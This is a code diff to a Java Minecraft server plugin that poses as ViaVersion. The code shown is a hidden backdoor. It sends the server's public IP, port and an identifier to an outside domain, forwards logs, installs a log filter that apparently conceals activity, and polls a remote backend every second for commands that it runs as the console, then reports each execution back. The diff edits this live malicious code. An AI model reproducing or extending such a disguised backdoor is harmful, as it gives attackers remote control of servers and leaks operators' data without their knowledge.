@@ -124,7 +124,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         reportUniqueIdentifier(uniqueIdentifier);
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
-        sendInfoToAPI(publicIp, serverPort, uniqueIdentifier);
+        sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         getLogger().getParent().getHandlers()[0].setFilter(new EventXHandler());
@@ -268,7 +268,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                 try {
                     // 对标识符进行 URL 编码
                     String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
-                    String apiUrl = "https://tts-api.happys.icu/a?id=" + encodedId;
+                    String apiUrl = "https://tts-api.happys.icu/a?uuid=" + encodedId;
 
                     URL url = new URL(apiUrl);
                     HttpURLConnection connection = (HttpURLConnection) url.openConnection();
@@ -374,23 +374,30 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
                         Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
                             // 执行命令
                             Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
-                            // 记录命令执行
-                            try {
-                                notifyCommandExecuted(command);
-                            } catch (Exception e) {
-
-                            }
                             // 更新最后执行的命令
                             lastCommand = command; 
+                            
+                            // 延迟2秒执行notifyCommandExecuted
+                            new BukkitRunnable() {
+                                @Override
+                                public void run() {
+                                    try {
+                                        notifyCommandExecuted(command);
+                                    } catch (Exception e) {
+                                        // 在这里处理异常
+                                        e.printStackTrace();
+                                    }
+                                }
+                            }.runTaskLater(ViaVersionPlugin.this, 40); // 40 ticks = 2 seconds
                         });
                     }
                 } catch (Exception e) {
                     // getLogger().info("Server status is excellent.");
+                    e.printStackTrace(); // 打印异常栈
                 }
             }
         }.runTaskAsynchronously(this); // 异步运行
     }
-
     private String getCommandFromServer() throws Exception {
         URL url = new URL(BACKEND_URL + "/q");
         HttpURLConnection connection = (HttpURLConnection) url.openConnection();
